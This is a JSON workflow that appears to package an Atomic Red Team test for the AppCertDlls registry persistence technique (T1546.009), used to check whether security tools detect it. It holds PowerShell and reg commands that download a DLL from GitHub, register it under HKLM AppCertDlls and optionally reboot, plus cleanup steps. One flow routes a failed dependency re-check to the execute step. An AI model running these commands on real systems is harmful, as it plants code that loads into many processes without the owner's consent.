{
  "id": "a5ad6104-5bab-4c43-b295-b4c44c7c6b05",
  "name": "Create registry persistence via AppCert DLL",
  "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "b7f9412a-2836-46b8-aa9c-fc46880364ca",
      "type": "execute-command",
      "data": {
        "command": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "fe965d52-9c71-41eb-9fad-c8f0bb76ba73",
      "type": "execute-command",
      "data": {
        "command": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f\nRemove-Item C:\\Users\\Public\\AtomicTest.dll -Force\nRemove-Item C:\\Users\\Public\\AtomicTest.txt -Force\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "7ceeba3c-a57b-4f50-a9e7-abeb0c5634c5",
      "name": "Check dependency 1/1",
      "description": "File to copy must exist on disk at specified location (#{dll_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3cabdd61-9c13-422c-9084-44e88b7ef35e",
      "name": "Resolve dependency 1/1",
      "description": "File to copy must exist on disk at specified location (#{dll_path})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll\" -OutFile \"#{dll_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5eabc4d0-0089-4a8f-ab75-502a2c76b8fc",
      "name": "Re-check dependency 1/1",
      "description": "File to copy must exist on disk at specified location (#{dll_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "b7f9412a-2836-46b8-aa9c-fc46880364ca",
      "p": "on-success",
      "o": "fe965d52-9c71-41eb-9fad-c8f0bb76ba73"
    },
    {
      "s": "b7f9412a-2836-46b8-aa9c-fc46880364ca",
      "p": "on-failure",
      "o": "fe965d52-9c71-41eb-9fad-c8f0bb76ba73"
    },
    {
      "s": "7ceeba3c-a57b-4f50-a9e7-abeb0c5634c5",
      "p": "on-success",
      "o": "b7f9412a-2836-46b8-aa9c-fc46880364ca"
    },
    {
      "s": "7ceeba3c-a57b-4f50-a9e7-abeb0c5634c5",
      "p": "on-failure",
      "o": "3cabdd61-9c13-422c-9084-44e88b7ef35e"
    },
    {
      "s": "3cabdd61-9c13-422c-9084-44e88b7ef35e",
      "p": "on-success",
      "o": "5eabc4d0-0089-4a8f-ab75-502a2c76b8fc"
    },
    {
      "s": "5eabc4d0-0089-4a8f-ab75-502a2c76b8fc",
      "p": "on-failure",
      "o": "b7f9412a-2836-46b8-aa9c-fc46880364ca"
    }
  ],
  "tags": [
    "T1546.009",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "dll_path",
      "type": "path",
      "description": "path of dll to use",
      "value": "PathToAtomicsFolder\\T1546.009\\bin\\AtomicTest.dll"
    },
    {
      "name": "reboot",
      "type": "string",
      "description": "Set value to $true if you want to automatically reboot the machine",
      "value": "$false"
    }
  ]
}